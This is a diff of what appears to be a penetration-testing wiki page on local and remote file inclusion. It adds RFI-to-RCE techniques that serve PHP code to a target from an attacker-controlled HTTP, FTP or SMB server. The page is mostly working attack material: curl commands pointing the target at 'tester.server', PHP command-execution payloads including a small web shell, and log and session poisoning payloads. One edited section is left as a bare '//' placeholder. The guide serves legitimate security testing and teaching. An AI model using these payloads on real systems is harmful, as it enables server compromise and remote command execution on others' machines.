@@ -41,6 +41,51 @@ Local file inclusions can sometimes be combined with other vulnerabilities to ac
 * unrestricted file upload
 * log poisoning
 
+Once an attacker is able to execute code on a target, testing the limitations of that code execution can help to go from code execution (e.g. PHP, ASPX, etc.) to command execution (e.g. Linux or Windows commands).
+
+With PHP as example, the tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the `phpinfo` in the response.
+
+{% hint style="warning" %}
+If the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
+{% endhint %}
+
+```bash
+# Create phpinfo.php
+echo '<?php phpinfo(); ?>' > phpinfo.php
+
+# Start a web server
+python3 -m http.server 80
+
+# Exploit the RFI to fetch the remote phpinfo.php file
+curl '$URL/?parameter=http://tester.server/phpinfo.php'
+```
+
+If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute code with one of the following payloads.
+
+{% hint style="info" %}
+As code execution functions can be filtered, the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted.
+{% endhint %}
+
+```php
+<?php system('whoami'); ?>
+```
+
+```php
+<?php exec('whoami'); ?>
+```
+
+```php
+<?php passthru('whoami'); ?>
+```
+
+```php
+<?php shell_exec('whoami'); ?>
+```
+
+```php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+```
+
 ### LFI to RCE (via logs poisoning)
 
 {% hint style="warning" %}
@@ -91,11 +136,17 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/access.log&cmd=id
 ```
 
 {% hint style="info" %}
-There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `access.log` path and file depending on the operating system/distribution:
+There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `access.log` path and file depending on the operating system/distribution:
 
-> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location – **/var/log/httpd/access\_log**
-> * Debian / Ubuntu Linux Apache access log file location – **/var/log/apache2/access.log**
-> * FreeBSD Apache access log file location – **/var/log/httpd-access.log**
+> * RHEL / Red Hat / CentOS / Fedora Linux Apache access file location: `/var/log/httpd/access_log`
+> * Debian / Ubuntu Linux Apache access log file location: `/var/log/apache2`/access.log
+> * FreeBSD Apache access log file location: `/var/log/httpd-access.log`
+> * Windows Apache access log file location: **** `C:\xampp\apache\logs`
+
+Or if the web server is under Nginx :
+
+> * Linux Nginx access log file location: `/var/log/nginx`
+> * Windows Nginx access log file location: `C:\nginx\log`
 {% endhint %}
 
 #### /var/log/apache/error.log
@@ -117,11 +168,17 @@ curl --user-agent "PENTEST" $URL/?parameter=/var/log/apache2/error.log&cmd=id
 ```
 
 {% hint style="info" %}
-There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) on the `error.log` path and file depending on the operating system/distribution:
+There are [some variations](https://blog.codeasite.com/how-do-i-find-apache-http-server-log-files/) of the `error.log` path and file depending on the operating system/distribution:
 
-> * RHEL / Red Hat / CentOS / Fedora Linux Apache error file location – **/var/log/httpd/error\_log**
-> * Debian / Ubuntu Linux Apache error log file location – **/var/log/apache2/error.log**
-> * FreeBSD Apache error log file location – **/var/log/httpd-error.log**
+* RHEL / Red Hat / CentOS / Fedora Linux Apache error file location: `/var/log/httpd/error_log`
+* Debian / Ubuntu Linux Apache error log file location: `/var/log/apache2/error.log`
+* FreeBSD Apache error log file location: `/var/log/httpd-error.log`
+* Windows Apache access log file location: **** `C:\xampp\apache\logs`
+
+Or if the web server is under Nginx :&#x20;
+
+* Linux Nginx access log file location: `/var/log/nginx`
+* Windows Nginx access log file location: `C:\nginx\log`
 {% endhint %}
 
 #### **/var/log/mail.log**
@@ -197,7 +254,6 @@ Testers can abuse a process created due to a request. The payload is injected in
 # Sending a request to $URL with a malicious user-agent
 # Accessing the payload via LFI
 curl --user-agent "<?php passthru($_GET['cmd']); ?>" $URL/?parameter=../../../proc/self/environ
-
 ```
 
 #### 🛠️ /proc/\*/fd
@@ -226,37 +282,54 @@ When a web server wants to handle sessions, it can use PHP session cookies (PHPS
 login=1&user=<?php system("id");?>&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_$PHPSESSID
 ```
 
-### RFI to RCE
+### RFI to RCE (via HTTP)
 
-The tester can create a `phpinfo.php` containing `<?php phpinfo(); ?>` and use a simple HTTP server so that the target application can fetch it. When exploiting the RFI to include the `phpinfo.php` file, the tester server will send the plaintext PHP code to the target server that should execute the code and show the `phpinfo` in the response.
+//
 
-{% hint style="warning" %}
-If the tester server used to host the `phpinfo.php` file can interpret PHP, it will. The tester will not achieve code execution on the target server but on his own instead. A simple HTTP server will do.
-{% endhint %}
+### RFI to RCE (via FTP)
+
+The tester can also host his arbitrary PHP code and access it through the **FTP** protocol. He can use the python library **pyftpdlib** to start a FTP server.
 
 ```bash
-# Create phpinfo.php
-echo '<?php phpinfo(); ?>' > phpinfo.php
-
-# Start a web server
-python3 -m http.server 80
+# Start FTP server
+sudo python3 -m pyftpdlib -p 21                                                                                                                                            1 ↵ alex@ubuntu
+[I 2022-07-11 00:04:26] concurrency model: async
+[I 2022-07-11 00:04:26] masquerade (NAT) address: None
+[I 2022-07-11 00:04:26] passive ports: None
+[I 2022-07-11 00:04:26] >>> starting FTP server on 0.0.0.0:21, pid=176948 <<<
 
 # Exploit the RFI to fetch the remote phpinfo.php file
-curl '$URL/?parameter=http://tester.server/phpinfo.php'
+curl '$URL/?parameter=ftp://tester.server/phpinfo.php'
 ```
 
-If the phpinfo has been successfully printed in the response, the tester can engage a more offensive approach by trying to execute code with one of the following payloads.
-
 {% hint style="info" %}
-As code execution functions can be filtered, the phpinfo testing phase is required to assert that arbitrary PHP code is included and interpreted.
+PHP uses the **anonymous** credentials to authenticate to the FTP server. If the tester needs to use custom credentials, he can authenticate as follows : &#x20;
+
+<mark style="color:blue;">`curl '$URL/?parameter=ftp://user:pass@tester.server/phpinfo.php'`</mark>
 {% endhint %}
 
-```php
-<?php system('whoami'); ?>
-<?php exec('whoami'); ?>
-<?php passthru('whoami'); ?>
-<?php shell_exec('whoami'); ?>
-<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+### RFI to RCE (via SMB)
+
+Sometimes, the vulnerable web application is hosted on a **Windows Server,** meaning the attacker could log into a **SMB Server** to store the arbitrary PHP code.&#x20;
+
+[Impacket](https://github.com/SecureAuthCorp/impacket)'s [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) (Python) script can be used on the attacker-controlled machine to create a SMB Server.&#x20;
+
+```
+sudo python3 smbserver.py -smb2support share $(pwd)                                                                                        130 ↵ alex@ubuntu
+Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+```
+
+The PHP script can then be included by using a [UNC](https://en.wikipedia.org/wiki/Universal\_Naming\_Convention) Path.
+
+```bash
+curl '$URL/?parameter=\\tester.server\phpinfo.php'
 ```
 
 ## References
